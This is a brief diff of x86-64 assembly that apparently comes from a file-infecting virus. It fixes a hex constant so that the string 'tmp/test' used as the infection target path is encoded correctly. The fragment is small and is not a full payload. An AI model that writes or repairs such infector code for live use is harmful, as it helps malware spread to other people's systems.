@@ -133,7 +133,7 @@ _continue_normaly:
 ;	jmp _push_it
 
 _infect_tmp_test:
-	mov		rax, 0x747365742f706d7			; %rax = "tmp/test"
+	mov		rax, 0x747365742f706d74			; %rax = "tmp/test"
 
 _push_it:
 	push	rax								; push infection path on stack
